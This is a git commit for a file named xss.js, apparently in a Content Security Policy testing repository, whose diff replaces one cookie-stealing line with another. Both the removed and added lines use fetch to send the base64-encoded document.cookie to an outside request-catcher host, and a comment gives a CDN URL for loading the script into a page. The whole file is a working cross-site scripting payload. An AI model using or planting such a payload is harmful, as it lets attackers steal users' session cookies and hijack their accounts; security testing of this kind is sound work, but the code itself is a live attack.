09a5de33514f2bd03bd42d1c2607660cb226001c
B.Q <150447764+000x15@users.noreply.github.com>
2026-08-15 09:51:30 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,2 @@
-fetch("https://webhook.site/d0981998-2416-4f1a-884f-d9b190c35104/?c="+btoa(document.cookie));
+// https://cdn.jsdelivr.net/gh/000x15/CSP-test/xss.js
+fetch("https://0x15.requestcatcher.com/?c="+btoa(document.cookie));
